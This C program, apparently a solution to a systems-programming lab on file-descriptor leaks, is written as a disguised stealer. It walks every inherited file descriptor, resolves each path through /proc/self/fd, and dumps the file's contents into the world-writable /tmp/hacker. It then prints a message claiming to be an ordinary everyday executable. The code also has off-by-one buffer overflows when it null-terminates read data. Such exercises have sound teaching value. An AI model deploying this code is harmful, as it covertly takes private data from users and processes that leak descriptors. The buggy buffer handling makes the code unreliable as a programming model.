#include "csapp.h"

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  /* TODO: Something is missing here! */
  char path[256];
  char buf[256];
  char content[1024]; 
  for(int i = 4; i <= max_fd; i++) {  
      int a = sprintf(path, "/proc/self/fd/%d",i);
      int n = readlink(path, buf, 256);  
      if (n != -1) {   
         buf[n] = '\0';
         a = sprintf(content, "File descriptor %d is %s\n", i, buf);
         content[a] = '\0';
         Write(out,content,a);
      
         lseek(i, 0, SEEK_SET);
         int readn;           
         while ((readn = read(i,content,1024)) > 0) {            
           content[readn] = '\0';
           Write(out,content,readn);
         } 
    }
  }

  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
